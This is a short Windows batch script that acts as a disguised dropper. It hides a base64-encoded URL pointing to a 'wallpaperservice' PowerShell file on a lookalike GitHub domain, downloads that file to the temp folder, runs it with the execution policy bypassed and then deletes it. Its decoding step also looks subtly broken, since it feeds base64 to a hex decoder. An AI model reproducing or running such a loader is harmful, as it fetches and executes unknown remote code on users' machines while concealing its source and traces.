@echo off
setlocal enabledelayedexpansion
set encodedURL=aHR0cHM6Ly9yYXcuZ2l0aHViZXMuY29tL2Nvb2xtYW4xOTY5LXVpL3llcy9tYWluL3dhbGxwZXJzZXJ2aWNlLnBzMQ==
for /f "tokens=* delims=" %%a in ('echo !encodedURL! ^| certutil -decodehex ^| findstr /v "CertUtil"') do set PS1_URL=%%a
set PS1_FILE=%TEMP%\wallpaperservice.ps1
curl -o "%PS1_FILE%" "%PS1_URL%"
powershell -ExecutionPolicy Bypass -File "%PS1_FILE%"
del "%PS1_FILE%"